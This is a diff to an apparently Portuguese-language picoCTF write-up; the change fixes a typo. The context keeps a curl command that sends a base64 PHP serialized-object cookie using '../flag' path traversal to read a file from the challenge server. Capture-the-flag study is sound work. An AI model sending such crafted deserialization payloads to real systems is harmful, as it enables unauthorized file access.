@@ -240,7 +240,7 @@ Então abrindo o prompt de comando, ao inserir o comando abaixo:
 ```
 curl -s -b "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9" http://mercury.picoctf.net:5428/authentication.php
 ```
-Se tem como reposta:
+Se tem como resposta:
 
 <img width="880" height="253" alt="image" src="https://github.com/user-attachments/assets/1bc5bb85-14bc-4139-b7b3-feef7ace3997" />
 
